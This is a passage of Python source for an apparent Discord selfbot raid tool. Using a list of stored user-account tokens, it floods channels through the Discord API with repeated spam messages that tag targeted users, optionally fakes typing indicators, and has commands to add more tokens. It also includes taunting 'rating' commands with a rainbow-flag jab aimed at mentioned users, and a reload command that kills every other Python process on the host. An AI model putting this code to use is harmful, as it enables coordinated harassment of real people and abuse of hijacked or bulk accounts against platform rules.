     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#spiced up line spam
def send_with_retry_startall4(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    canal = ctx.channel.id
    while tokens6[1]:
     for message in spiced_multi_line_spam_messages:
      for i in tokens2:
        formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"{formatted_message} {mentions}"} 
        if not tokens6[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue
     
        
async def send_with_retry11(ctx,mesaj):
    await ctx.send(mesaj)

async def send_with_retry12(ctx,mesaj):
    await ctx.send(mesaj)

# set scripts for fun client

async def pulamea(ctx, user_mentions=None):
    mentions = ' '.join([mention.mention for mention in user_mentions])
    if mentions != "<@!1011893358316236850>" or mentions != "<@1011893358316236850>" or mentions != "<@929832595770982400>" or mentions != "<@!929832595770982400>":
     number = random.randrange(100)
    else:
        number = "10000000000000000"
    if mentions == "<@720929564800450630>":
      mesaj = f"# <@{ctx.author.id}> :revolving_hearts: {mentions} = 0%"
    else:
        mesaj = f"# <@{ctx.author.id}> :revolving_hearts: {mentions} = {number}%"
    await send_with_retry11(ctx, f"{mesaj}")

async def pulamea2(ctx, user_mentions=None):
    if user_mentions == () or user_mentions == "" or user_mentions == None or user_mentions == "" or user_mentions == [] or user_mentions == {}:
        mesaj = f"# <@{ctx.author.id}> = {random.randrange(100)}% :rainbow_flag:"
        await send_with_retry12(ctx, f"{mesaj}")
    else:
     mentions = ' '.join([mention.mention for mention in user_mentions])
     mesaj = f"# {mentions} = {random.randrange(100)}% :rainbow_flag:"
     await send_with_retry12(ctx, f"{mesaj}")

# prepare for send and retry scripts

async def send_messages_single_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     for message in single_line_spam_messages:
      if tokens[count] == False:
          return
      if user_mentions:
         mentions = ' '.join([mention.mention for mention in user_mentions])
         if big_text[0]:
          mesaj = f"# > {message} {mentions}"
         elif not big_text[0]:
          mesaj = f"{message} {mentions}" 
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()   
         await send_with_retry(ctx,mesaj, tokensdelay1[count],count)
      else:
         if big_text[0]:
          mesaj = f"# > {message}"
         elif not big_text[0]:
          mesaj = f"{message}"   
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()
         await send_with_retry(ctx,mesaj, tokensdelay1[count],count)
      await asyncio.sleep(tokensdelay1[count])

async def send_messages_single_line_spam_channel(ctx, user_mentions=None,count=None,canalid=None):
    count = int(count)
    await ctx.message.delete()
    while tokenschannel1[count]:
     for message in single_line_spam_messages:
      if tokenschannel1[count] == False:
          return
      if user_mentions:
         mentions = ' '.join([mention.mention for mention in user_mentions])
         mesaj = f"# > {message} {mentions}"
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()   
         await send_with_retrychannel(ctx,mesaj, tokensdelay1[count],count,canalid)
      else:
         mesaj = f"# > {message}"
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()
         await send_with_retrychannel(ctx,mesaj, tokensdelay1[count],count,canalid)
      await asyncio.sleep(tokensdelay1[count])

async def send_messages_multi_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     for message in multi_line_spam_messages:
      if tokens[count] == False:
        return
      if user_mentions:
          mentions = ' '.join([mention.mention for mention in user_mentions])
          mesaj = f"{message} {mentions}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()   
          await send_with_retry2(ctx,mesaj, tokensdelay2[count],count)
      else:
          mesaj = f"{message}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()
          await send_with_retry2(ctx,mesaj, tokensdelay2[count],count)
      await asyncio.sleep(tokensdelay2[count])

async def send_messages_multi_line_spam_channel(ctx, user_mentions=None,count=None,canalid=None):
    count = int(count)
    await ctx.message.delete()
    while tokenschannel1[count]:
     for message in multi_line_spam_messages:
      if tokenschannel1[count] == False:
        return
      if user_mentions:
          mentions = ' '.join([mention.mention for mention in user_mentions])
          mesaj = f"{message} {mentions}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()   
          await send_with_retrychannel2(ctx,mesaj, tokensdelay2[count],count,canalid)
      else:
          mesaj = f"{message}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()
          await send_with_retrychannel2(ctx,mesaj, tokensdelay2[count],count,canalid)
      await asyncio.sleep(tokensdelay2[count])

async def repeated_message_spam(ctx,count=None,message=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     if tokens[count] == False:
        return
     #thred = threading.Thread(target=send_with_retry3,args=(ctx, message, repeated_message_spam_delay,count),daemon=True)
     #thred.start()
     await send_with_retry3(ctx, message, tokensdelay3[count],count)
     await asyncio.sleep(tokensdelay3[count])
     
async def repeated_message_spam_channel(ctx,count=None,message=None,canalid=None):
    count = int(count)
    await ctx.message.delete()
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
        return
     #thred = threading.Thread(target=send_with_retry3,args=(ctx, message, repeated_message_spam_delay,count),daemon=True)
     #thred.start()
     await send_with_retrychannel3(ctx, message, tokensdelay3[count],count,canalid)
     await asyncio.sleep(tokensdelay3[count])     
        
async def send_spiced_multi_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    while tokens[count]:
     for message in spiced_multi_line_spam_messages:
        if tokens[count] == False:
         return
        if user_mentions:
            mentions = ' '.join([mention.mention for mention in user_mentions])
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message} {mentions}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retry4(ctx, f"{formatted_message} {mentions}", tokensdelay4[count],count)
        else:
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retry4(ctx, formatted_message, tokensdelay4[count],count)
        await asyncio.sleep(tokensdelay4[count])
        
async def send_spiced_multi_line_spam_channel(ctx, user_mentions=None,count=None,canalid=None):
    count = int(count)
    while tokenschannel1[count]:
     for message in spiced_multi_line_spam_messages:
        if tokenschannel1[count] == False:
         return
        if user_mentions:
            mentions = ' '.join([mention.mention for mention in user_mentions])
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message} {mentions}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retrychannel4(ctx, f"{formatted_message} {mentions}", tokensdelay4[count],count,canalid)
        else:
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retrychannel4(ctx, formatted_message, tokensdelay4[count],count,canalid)
        await asyncio.sleep(tokensdelay4[count])        
# single line spam commands

#normal start
@client_single_line_spam.command()
async def start(ctx, count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    if tokens[count] == True:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Script is already started on this token`"})
        return
    tokens[count] = True
    await send_messages_single_line_spam(ctx, user_mentions,count)

#startchannel
@client_single_line_spam.command()
async def startchannel(ctx,count=None,canalid=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
        return
    count = int(count)
    count -= 1
    if tokenschannel1[count] == True:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Script is already started on this token`"})
        return
    tokenschannel1[count] = True
    await send_messages_single_line_spam_channel(ctx, user_mentions,count,canalid)

#startall
@client_single_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens3[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall
                             ,args=(ctx, user_mentions)
                             ,daemon=True)
    thred.start()

#typing
@client_single_line_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping1[count] = True
    elif choice in optiunineadv:
     tokenstyping1[count] = False
 
#typingall     
@client_single_line_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping1[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping1[i] = False    

#delay
@client_single_line_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay1[count] = delay1
    await ctx.message.delete()

#delayall
@client_single_line_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay1[i] = int(delay2)

#size
@client_single_line_spam.command()
async def size(ctx, text_value=None):
    big_choices = ['Big','BIG','big']
    small_choices = ['Small','SMALL','small']
    if text_value not in big_choices and text_value not in small_choices:
        return
    if text_value in big_choices:
        big_text[0] = True
    elif text_value in small_choices:
        big_text[0] = False    
    await ctx.message.delete()

# multi line spam commands

#start
@client_multi_line_spam.command()
async def start(ctx, count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await send_messages_multi_line_spam(ctx, user_mentions,count)

#startchannel
@client_multi_line_spam.command()
async def startchannel(ctx, count=None,canalid=None, *user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokenschannel1[count] = True
    await send_messages_multi_line_spam_channel(ctx, user_mentions,count,canalid)

#startall
@client_multi_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens4[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall2
                             ,args=(ctx, user_mentions)
                             ,daemon=True)
    thred.start()

#reload
@client_multi_line_spam.command()
async def reload(ctx):
    await ctx.message.delete()
    current_process = psutil.Process(os.getpid())
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.pid != current_process.pid:
            try:
                if "python" in proc.info['name'].lower() and proc.pid:
                    proc.kill()
                    proc.wait()
            except Exception as e:
                return

    pitonel = sys.executable
    os.execl(pitonel, pitonel, *sys.argv)

#typing
@client_multi_line_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping2[count] = True
    elif choice in optiunineadv:
     tokenstyping2[count] = False

#typingall
@client_multi_line_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping2[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping2[i] = False

#delay
@client_multi_line_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay2[count] = delay1
    await ctx.message.delete()
    
#delayall   
@client_multi_line_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay2[i] = int(delay2)


# repeated message spam commands

#start
@client_repeated_message_spam.command()
async def start(ctx,count=None, *, message):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await repeated_message_spam(ctx,count,message)

#startchannel
@client_repeated_message_spam.command()
async def startchannel(ctx,count=None,canalid=None, *, message):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
        return
    count = int(count)
    count -= 1
    tokenschannel1[count] = True
    await repeated_message_spam_channel(ctx,count,message,canalid)

#startall
@client_repeated_message_spam.command()
async def startall(ctx, *, message):
    for i in range(len(tokens)):
        tokens5[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall3
                             ,args=(ctx,message)
                             ,daemon=True)
    thred.start()

#typing
@client_repeated_message_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping3[count] = True
    elif choice in optiunineadv:
     tokenstyping3[count] = False

#typingall
@client_repeated_message_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping3[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping3[i] = False

#delay
@client_repeated_message_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',
                   headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay3[count] = delay1
    await ctx.message.delete()

#delayall
@client_repeated_message_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay3[i] = int(delay2)

# spiced up multi line commands

#start
@client_spiced_multi_line_spam.command()
async def start(ctx,count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await ctx.message.delete()
    await send_spiced_multi_line_spam(ctx,user_mentions,count)

#startchannel
@client_spiced_multi_line_spam.command()
async def startchannel(ctx,count=None,canalid=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token},json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
        return
    count = int(count)
    count -= 1
    tokenschannel1[count] = True
    await ctx.message.delete()
    await send_spiced_multi_line_spam_channel(ctx,user_mentions,count,canalid)

#startall
@client_spiced_multi_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens6[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall4
                             ,args=(ctx,user_mentions)
                             ,daemon=True)
    thred.start()

#typing
@client_spiced_multi_line_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping4[count] = True
    elif choice in optiunineadv:
     tokenstyping4[count] = False

#typingall
@client_spiced_multi_line_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping4[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping4[i] = False

#delay
@client_spiced_multi_line_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay4[count] = delay1
    await ctx.message.delete()

#delayall    
@client_spiced_multi_line_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay4[i] = int(delay2)

# single line spam stop commands

#stop
@client_single_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()

#stopchannel
@client_single_line_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    await ctx.message.delete()
    
#stopall   
@client_single_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens3[i] = False
    await ctx.message.delete()

# multi line spam stop commands

#stop
@client_multi_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()

#stopchannel
@client_multi_line_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    await ctx.message.delete()

#stopall
@client_multi_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens4[i] = False
    await ctx.message.delete()

# repeated message spam stop commands

#stop
@client_repeated_message_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()

#stopchannel
@client_repeated_message_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    await ctx.message.delete()

#stopall
@client_repeated_message_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens5[i] = False
    await ctx.message.delete()

# spiced up multi line spam stop commands

#stop
@client_spiced_multi_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()

#stopchannel
@client_spiced_multi_line_spam.command()
async def stopchannel(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokenschannel1[count] = False
    await ctx.message.delete()

#stopall
@client_spiced_multi_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens6[i] = False
    await ctx.message.delete()

# token checking commands

#tokenlist
@client_multi_line_spam.command()
async def tokenlist(ctx):
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"authorization":token}
                  ,json={"content":f"# `{len(tokens)} tokens in tokens.txt`"})
    return

#tokenuser
@client_multi_line_spam.command()
async def tokenuser(ctx):
    for mata in usernameuri:
        pass
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"authorization":token}
                  ,json={"content":f"`{mata}`"})
    return

#comenzi
@client_multi_line_spam.command()
async def comenzi(ctx):
    for i in comendute:
        pass
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"Authorization":token}
                  ,json={"content":i})
    return

#addtoken
@client_multi_line_spam.command()
async def addtoken(ctx, toljavan=None):
    toljavan = str(toljavan)
    verified_token = new_main_token_validation(toljavan)
    await ctx.message.delete()
    if not verified_token:
        return
    aux = open("tokens.txt",'r').read().splitlines()
    if verified_token in aux:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"Authorization":token}
                  ,json={"content":"`Token is invalid`"})
        return
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                  ,headers={"Authorization":token}
                  ,json={"content":"Token has been succesfully validated."})
    with open('tokens.txt','a') as file:
        file.write(f"\n{verified_token}")
    tokens.append(verified_token)
    tokens2.append(verified_token)
    tokens3.append(verified_token)
    tokens4.append(verified_token) 
    tokens5.append(verified_token) 
    tokens6.append(verified_token) 
    tokensdelay1.append(verified_token) 
    tokensdelay2.append(verified_token) 
    tokensdelay3.append(verified_token) 
    tokensdelay4.append(verified_token) 
    tokenstyping1.append(verified_token) 
    tokenstyping2.append(verified_token) 
    tokenstyping3.append(verified_token) 
    tokenstyping4.append(verified_token) 
    tokenschannel1.append(verified_token)
    tokenschannel2.append(verified_token)
    tokenschannel3.append(verified_token)
    tokenschannel4.append(verified_token)
    tokensglobaltyping.append(verified_token) 
    tokensstreaming.append(verified_token) 
